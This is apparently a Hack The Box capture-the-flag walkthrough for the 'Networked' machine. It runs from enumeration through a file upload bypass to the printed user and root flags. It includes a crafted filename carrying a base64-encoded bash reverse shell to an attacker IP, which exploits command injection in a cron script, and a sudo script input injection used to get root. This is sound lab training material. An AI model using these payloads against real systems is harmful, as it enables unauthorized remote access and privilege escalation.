# Networked
>Author : Xyan1d3
>Date : 6th July 2021
>IP : 10.10.10.146
>OS : Linux
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jul  6 23:30:20 2021 as: nmap -sC -sV -v -oN nmap/networked 10.10.10.146
Nmap scan report for networked.htb (10.10.10.146)
Host is up (0.063s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

## Gobuster
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/networked]
└──╼ # gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -t 100 -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/07/06 23:31:57 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/photos.php           (Status: 200) [Size: 1302]                                  
/index.php            (Status: 200) [Size: 229]                                   
/upload.php           (Status: 200) [Size: 169]                                   
/lib.php              (Status: 200) [Size: 0]                                     
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/] 
                                                                                  
===============================================================
2021/07/06 23:39:51 Finished
===============================================================
```

## Web Enumeration
We visit the site and navigate to `photos.php` and find out that it lists the photos.
![[Pasted image 20210706235457.png]]

Now, We check the `/backup` and find out that there is a `backup.tar` which is the web directory files.

# Initial FootHold
In the source of `upload.php` we see that it checks for extensions and mime type which can be easily bypassed.
![[Pasted image 20210706235848.png]]

We get a shell back as the `apache` user.
![[Pasted image 20210707000018.png]]

# User Escalation to guly
We visit the `/home/guly/` and find out that we have a `check_attack.php` which is being executed every `3 minutes`.
```php
bash-4.2$ ls
check_attack.php  crontab.guly  user.txt
bash-4.2$ cat check_attack.php 
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &"); <---CMD injection here
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

As here they are hard coding the path `/var/www/html/uploads` which is shoved into an rm command we may create a file like `;bash reverse shell;` and it will be executed as it will be hardcoded into the rm command by php.

We create a file like 
```python
bash-4.2$ ls -l /var/www/html/uploads/
total 24
-rw-r--r--  1 apache apache  107 Jul  6 20:28 10_10_14_18.php.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_1.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_2.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_3.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_4.png
-rw-r--r--  1 apache apache    0 Jul  6 20:43 ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE= |base64 -d|bash;
-r--r--r--. 1 root   root      2 Oct 30  2018 index.html
```

Now, We wait for `3` minutes and get a shell back as the user `guly`.
![[Pasted image 20210707002452.png]]

## Getting the user Flag
```python
[guly@networked ~]$ ls -l
total 16
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-rw-------  1 guly guly 774 Jul  6 20:51 dead.letter
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
[guly@networked ~]$ cat user.txt 
526cfc2305f17faaacecf212c57d71c5
```

# Root Escalation
We do a `sudo -l` and find out that have a sudo `nopasswd` on `/usr/local/sbin/changename.sh`.
```python
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL
    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

On running this file we need to enter any of the inputs with a space and a command and it will be executed.
```python
[guly@networked ~]$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh 
interface NAME:
magisk bash
interface PROXY_METHOD:
magisk
interface BROWSER_ONLY:
magisk
interface BOOTPROTO:
magisk
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
```

## Getting the root Flag
```python
[root@networked network-scripts]# cd /root/
[root@networked ~]# ls -l
total 4
-r--------. 1 root root 33 Oct 30  2018 root.txt
[root@networked ~]# cat root.txt 
0a8ecda83f1d81251099e8ac3d0dcb82
```